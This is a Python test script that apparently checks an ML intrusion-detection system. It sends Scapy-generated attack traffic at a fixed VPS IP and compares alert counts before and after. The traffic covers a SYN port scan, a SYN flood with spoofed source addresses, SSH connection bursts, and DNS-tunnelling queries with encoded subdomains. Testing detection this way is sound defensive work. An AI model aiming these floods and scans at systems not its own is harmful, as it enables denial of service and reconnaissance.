#!/usr/bin/env python3
"""
ThreatMatrix AI — External Attack Runner (WSL / Linux)
=======================================================

Runs attack simulations against the VPS from an external machine.
Traffic arrives via the internet through eth0 on the VPS.

Usage (from WSL or local Linux):
    sudo python3 run_external_attacks.py
    sudo python3 run_external_attacks.py --target 187.124.45.161
    sudo python3 run_external_attacks.py --scenario 1

Requires: scapy (pip install scapy)
Must run as root/sudo for raw socket access.
"""

import argparse
import json
import os
import random
import base64
import time
import sys

# ANSI colors
CYAN = "\033[0;36m"
GREEN = "\033[0;32m"
YELLOW = "\033[1;33m"
RED = "\033[0;31m"
BOLD = "\033[1m"
NC = "\033[0m"

WAIT_AFTER_ATTACK = 45  # External attacks need more time (network latency)
API_RETRIES = 3        # Number of retries for API calls
API_TIMEOUT = 30       # Seconds per attempt


def api_get(api_url, path, retries=API_RETRIES):
    """GET from ThreatMatrix API with retry logic."""
    from urllib.request import Request, urlopen
    last_err = None
    for attempt in range(retries):
        try:
            req = Request(f"{api_url}{path}")
            with urlopen(req, timeout=API_TIMEOUT) as resp:
                return json.loads(resp.read().decode())
        except Exception as e:
            last_err = e
            if attempt < retries - 1:
                wait = 5 * (attempt + 1)
                print(f"    {YELLOW}[retry] API call failed ({e}), retrying in {wait}s...{NC}")
                time.sleep(wait)
    return {"error": str(last_err)}


def get_alert_stats(api_url):
    """Get alert stats."""
    return api_get(api_url, "/api/v1/alerts/stats")


def wait_for_connectivity(api_url, max_wait=90):
    """Wait up to max_wait seconds for API to become reachable again.
    
    After a DDoS scenario the hosting provider's firewall may
    temporarily block our IP. This polls until connectivity returns.
    """
    from urllib.request import Request, urlopen
    print(f"\n  {YELLOW}[*] Verifying API connectivity...{NC}", end="", flush=True)
    start = time.time()
    while time.time() - start < max_wait:
        try:
            req = Request(f"{api_url}/api/v1/system/health")
            with urlopen(req, timeout=10) as resp:
                resp.read()
            print(f" {GREEN}OK{NC}")
            return True
        except Exception:
            print(".", end="", flush=True)
            time.sleep(5)
    print(f" {RED}TIMEOUT after {max_wait}s{NC}")
    print(f"  {YELLOW}[!] Your IP may be blocked by VPS DDoS protection.{NC}")
    print(f"  {YELLOW}    SSH into VPS and run: iptables -F{NC}")
    return False


def print_header(title, color=CYAN):
    """Print a formatted scenario header."""
    print(f"\n{color}{BOLD}{'━' * 60}")
    print(f"  {title}")
    print(f"{'━' * 60}{NC}\n")


def wait_and_check(api_url, pre_stats, scenario_name, expected_sev, expected_cat):
    """Wait for ML processing then check for new alerts."""
    print(f"\n  {YELLOW}⏳ Waiting {WAIT_AFTER_ATTACK}s for capture→ML→alert pipeline...{NC}")

    # Poll periodically instead of sleeping the full duration
    for i in range(WAIT_AFTER_ATTACK // 5):
        time.sleep(5)
        current = get_alert_stats(api_url)
        current_total = current.get("total", 0)
        pre_total = pre_stats.get("total", 0)
        new = current_total - pre_total
        print(f"    [{(i+1)*5}s] Total: {current_total} (+{new} new)", end="")
        if new > 0:
            print(f" {GREEN}← alerts appearing{NC}")
        else:
            print()

    post_stats = get_alert_stats(api_url)
    pre_total = pre_stats.get("total", 0)
    post_total = post_stats.get("total", 0)
    new_alerts = post_total - pre_total

    pre_sev = pre_stats.get("by_severity", {})
    post_sev = post_stats.get("by_severity", {})

    print(f"\n  {'─' * 50}")
    print(f"  {BOLD}Results: {scenario_name}{NC}")
    print(f"  Total alerts: {pre_total} → {post_total} (+{new_alerts})")
    print(f"  Severity breakdown:")
    for sev in ["critical", "high", "medium", "low"]:
        pre_count = pre_sev.get(sev, 0)
        post_count = post_sev.get(sev, 0)
        delta = post_count - pre_count
        marker = f" {GREEN}← +{delta} NEW{NC}" if delta > 0 else ""
        print(f"    {sev.upper():10s}: {post_count:5d}{marker}")

    if expected_cat:
        pre_cat = pre_stats.get("by_category", {})
        post_cat = post_stats.get("by_category", {})
        print(f"  Category '{expected_cat}': "
              f"{pre_cat.get(expected_cat, 0)} → {post_cat.get(expected_cat, 0)}")

    if new_alerts > 0:
        expected_delta = post_sev.get(expected_sev, 0) - pre_sev.get(expected_sev, 0)
        if expected_delta > 0:
            print(f"\n  {GREEN}✅ PASS — {new_alerts} alert(s), {expected_sev.upper()} severity detected{NC}")
            return "PASS"
        else:
            gained = [s for s in ["critical", "high", "medium", "low"]
                     if post_sev.get(s, 0) > pre_sev.get(s, 0)]
            print(f"\n  {YELLOW}⚠ PARTIAL — {new_alerts} alert(s) as "
                  f"{', '.join(s.upper() for s in gained)} (expected {expected_sev.upper()}){NC}")
            return "PARTIAL"
    else:
        print(f"\n  {RED}✗ NOT DETECTED — 0 new alerts{NC}")
        return "FAIL"


def scenario_port_scan(target, api_url):
    """SYN port scan using Scapy → expect HIGH probe alerts."""
    print_header("Scenario 1: Port Scan (SYN)", CYAN)

    from scapy.all import IP, TCP, send, conf
    conf.verb = 0

    pre = get_alert_stats(api_url)
    print(f"  Pre-attack alerts: {pre.get('total', 0)}")
    print(f"  Sending SYN packets to {target} ports 1-1024...")

    for port in range(1, 1025):
        pkt = IP(dst=target) / TCP(
            sport=random.randint(1024, 65535), dport=port, flags="S"
        )
        send(pkt, verbose=0)
        if port % 200 == 0:
            print(f"    Sent {port}/1024...")

    print(f"  {GREEN}[+] 1024 SYN packets sent{NC}")
    return wait_and_check(api_url, pre, "Port Scan", "high", "port_scan")


def scenario_ddos(target, api_url, duration=8):
    """SYN flood using Scapy → expect CRITICAL dos alerts.
    
    NOTE: Reduced to 8s / ~5000 packets to avoid triggering the
    hosting provider's DDoS protection which blocks our real IP.
    """
    print_header("Scenario 2: DDoS SYN Flood", RED)

    from scapy.all import IP, TCP, send, conf
    conf.verb = 0

    pre = get_alert_stats(api_url)
    print(f"  Pre-attack alerts: {pre.get('total', 0)}")
    print(f"  Sending SYN flood to {target}:80 for {duration}s (reduced to avoid IP block)...")

    sent = 0
    start = time.time()
    batch = []

    while time.time() - start < duration:
        # Randomize source IP to simulate botnet
        src_ip = f"10.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        pkt = IP(src=src_ip, dst=target) / TCP(
            sport=random.randint(1024, 65535), dport=80,
            flags="S", seq=random.randint(0, 4294967295)
        )
        batch.append(pkt)
        sent += 1

        # Send in batches of 50 (smaller bursts = less likely to trip firewall)
        if len(batch) >= 50:
            send(batch, verbose=0)
            batch = []

        if sent % 1000 == 0:
            elapsed = time.time() - start
            print(f"    Sent {sent} packets ({sent/max(elapsed,0.1):.0f}/s)...")

    # Send remaining
    if batch:
        send(batch, verbose=0)

    print(f"  {GREEN}[+] {sent} SYN flood packets sent in {duration}s{NC}")
    return wait_and_check(api_url, pre, "DDoS SYN Flood", "critical", "ddos")


def scenario_brute_force(target, api_url, num_attempts=300):
    """SSH brute force using Scapy → expect HIGH r2l alerts."""
    print_header("Scenario 3: SSH Brute Force", YELLOW)

    from scapy.all import IP, TCP, send, conf
    conf.verb = 0

    pre = get_alert_stats(api_url)
    print(f"  Pre-attack alerts: {pre.get('total', 0)}")
    print(f"  Sending {num_attempts} SYN packets to {target}:22...")

    for i in range(num_attempts):
        pkt = IP(dst=target) / TCP(
            sport=random.randint(1024, 65535), dport=22, flags="S"
        )
        send(pkt, verbose=0)
        if (i + 1) % 50 == 0:
            print(f"    Sent {i + 1}/{num_attempts}...")
        time.sleep(0.02)

    print(f"  {GREEN}[+] {num_attempts} SSH connection attempts sent{NC}")
    return wait_and_check(api_url, pre, "SSH Brute Force", "high", "unauthorized_access")


def scenario_dns_tunnel(target, api_url, num_queries=200):
    """DNS tunneling using Scapy → expect MEDIUM alerts."""
    print_header("Scenario 4: DNS Tunneling", CYAN)

    from scapy.all import IP, UDP, DNS, DNSQR, send, conf
    conf.verb = 0

    pre = get_alert_stats(api_url)
    print(f"  Pre-attack alerts: {pre.get('total', 0)}")
    print(f"  Sending {num_queries} high-entropy DNS queries to {target}:53...")

    for i in range(num_queries):
        raw = os.urandom(30)
        encoded = base64.b64encode(raw).decode().rstrip("=")
        qname = f"{encoded}.exfil-tunnel-data.net"
        pkt = IP(dst=target) / UDP(
            sport=random.randint(1024, 65535), dport=53
        ) / DNS(rd=1, qd=DNSQR(qname=qname))
        send(pkt, verbose=0)
        if (i + 1) % 50 == 0:
            print(f"    Sent {i + 1}/{num_queries}...")
        time.sleep(0.03)

    print(f"  {GREEN}[+] {num_queries} DNS tunneling queries sent{NC}")
    return wait_and_check(api_url, pre, "DNS Tunneling", "medium", "anomaly")


def scenario_normal_traffic(target, api_url):
    """Normal HTTP traffic → expect NO new alerts."""
    print_header("Scenario 5: Normal Traffic (False Positive Check)", GREEN)

    pre = get_alert_stats(api_url)
    pre_total = pre.get("total", 0)
    print(f"  Pre-traffic alerts: {pre_total}")
    print(f"  Sending 20 normal HTTP requests...")

    from urllib.request import Request, urlopen
    endpoints = [
        "/api/v1/system/health", "/api/v1/flows/?limit=10",
        "/api/v1/alerts/?limit=5", "/api/v1/flows/stats",
    ]

    success = 0
    for i in range(20):
        ep = endpoints[i % len(endpoints)]
        try:
            req = Request(f"{api_url}{ep}")
            with urlopen(req, timeout=20) as resp:
                resp.read()
                success += 1
        except Exception:
            pass
        time.sleep(random.uniform(0.5, 1.5))

    print(f"  {GREEN}[+] {success}/20 requests succeeded{NC}")

    time.sleep(20)
    post = get_alert_stats(api_url)
    post_total = post.get("total", 0)
    new_alerts = post_total - pre_total

    if new_alerts == 0:
        print(f"\n  {GREEN}✅ PASS — No false positives{NC}")
        return "PASS"
    else:
        print(f"\n  {RED}✗ FALSE POSITIVES — {new_alerts} unexpected alerts{NC}")
        return "FALSE_POS"


def main():
    parser = argparse.ArgumentParser(description="ThreatMatrix AI — External Attack Runner")
    parser.add_argument("--target", default="187.124.45.161", help="VPS IP address")
    parser.add_argument("--api", default=None, help="API URL (default: http://<target>:8000)")
    parser.add_argument("--scenario", type=int, default=0, help="Run specific scenario (1-5, 0=all)")
    parser.add_argument("--wait", type=int, default=45, help="Wait seconds per attack (default: 45)")
    parser.add_argument("--skip-ddos", action="store_true", help="Skip DDoS scenario (avoids IP block)")
    args = parser.parse_args()

    global WAIT_AFTER_ATTACK
    WAIT_AFTER_ATTACK = args.wait
    target = args.target
    api_url = args.api or f"http://{target}:8000"

    print(f"""{BOLD}{CYAN}
╔══════════════════════════════════════════════════════════════╗
║  ThreatMatrix AI — External Attack Runner (WSL/Linux)       ║
║  Target: {target:<48s} ║
║  API:    {api_url:<48s} ║
╚══════════════════════════════════════════════════════════════╝{NC}
""")

    # Check root
    if os.geteuid() != 0:
        print(f"{RED}[ERROR] Must run as root for raw sockets. Use: sudo python3 {sys.argv[0]}{NC}")
        sys.exit(1)

    # Check scapy
    try:
        import scapy.all
        print(f"{GREEN}[+] Scapy available{NC}")
    except ImportError:
        print(f"{RED}[ERROR] scapy not installed. Install with: pip install scapy{NC}")
        sys.exit(1)

    # Check API connectivity (with retries)
    print(f"{YELLOW}[*] Checking API connectivity at {api_url}...{NC}")
    if not wait_for_connectivity(api_url, max_wait=30):
        print(f"{RED}[ERROR] Cannot reach API after retries.{NC}")
        print(f"{YELLOW}[!] Troubleshooting:{NC}")
        print(f"    1. SSH into VPS: ssh root@{target}")
        print(f"    2. Check API: curl http://localhost:8000/api/v1/system/health")
        print(f"    3. Clear firewall: iptables -F")
        print(f"    4. Restart if needed: docker compose up -d --force-recreate backend")
        sys.exit(1)

    # Baseline
    stats = get_alert_stats(api_url)
    print(f"\n{CYAN}Baseline: {stats.get('total', 0)} total alerts{NC}")
    sev = stats.get("by_severity", {})
    for s in ["critical", "high", "medium", "low"]:
        print(f"  {s.upper():10s}: {sev.get(s, 0)}")

    # Build scenario list
    scenarios = {
        1: ("Port Scan",      lambda: scenario_port_scan(target, api_url)),
        2: ("DDoS Flood",     lambda: scenario_ddos(target, api_url)),
        3: ("SSH Brute Force", lambda: scenario_brute_force(target, api_url)),
        4: ("DNS Tunnel",     lambda: scenario_dns_tunnel(target, api_url)),
        5: ("Normal Traffic",  lambda: scenario_normal_traffic(target, api_url)),
    }

    if args.skip_ddos:
        print(f"\n  {YELLOW}[!] Skipping DDoS scenario (--skip-ddos){NC}")
        del scenarios[2]

    results = []
    if args.scenario > 0:
        if args.scenario not in scenarios:
            print(f"{RED}Invalid scenario: {args.scenario}. Choose 1-5.{NC}")
            sys.exit(1)
        name, fn = scenarios[args.scenario]
        result = fn()
        results.append((name, result))
    else:
        scenario_keys = sorted(scenarios.keys())
        for i, num in enumerate(scenario_keys):
            name, fn = scenarios[num]

            # Re-verify connectivity before each scenario (in case DDoS blocked us)
            if i > 0:
                if not wait_for_connectivity(api_url, max_wait=60):
                    print(f"  {RED}[!] Lost connectivity — skipping remaining scenarios{NC}")
                    print(f"  {YELLOW}    SSH into VPS and run: iptables -F{NC}")
                    break

            result = fn()
            results.append((name, result))

            # Cooldown between scenarios
            if i < len(scenario_keys) - 1:
                cooldown = 30 if num == 2 else 15  # Extra cooldown after DDoS
                print(f"\n  {YELLOW}Cooldown {cooldown}s...{NC}")
                time.sleep(cooldown)

    # Final Summary
    final_stats = get_alert_stats(api_url)
    final_sev = final_stats.get("by_severity", {})

    print(f"\n{BOLD}{CYAN}{'═' * 60}")
    print(f"  EXTERNAL ATTACK SIMULATION — FINAL RESULTS")
    print(f"{'═' * 60}{NC}\n")

    for name, result in results:
        if result == "PASS":
            icon = f"{GREEN}✅{NC}"
        elif result == "PARTIAL":
            icon = f"{YELLOW}⚠{NC}"
        elif result == "FALSE_POS":
            icon = f"{RED}🚨{NC}"
        else:
            icon = f"{RED}✗{NC}"
        print(f"  {icon}  {name}: {result}")

    print(f"\n  {BOLD}Final Severity Distribution:{NC}")
    for s in ["critical", "high", "medium", "low"]:
        count = final_sev.get(s, 0)
        bar = "█" * min(count, 40)
        print(f"    {s.upper():10s}: {count:5d} {bar}")

    pass_count = sum(1 for _, r in results if r in ("PASS", "PARTIAL"))
    total = len(results)
    print(f"\n  {BOLD}Score: {pass_count}/{total} scenarios detected{NC}\n")


if __name__ == "__main__":
    main()
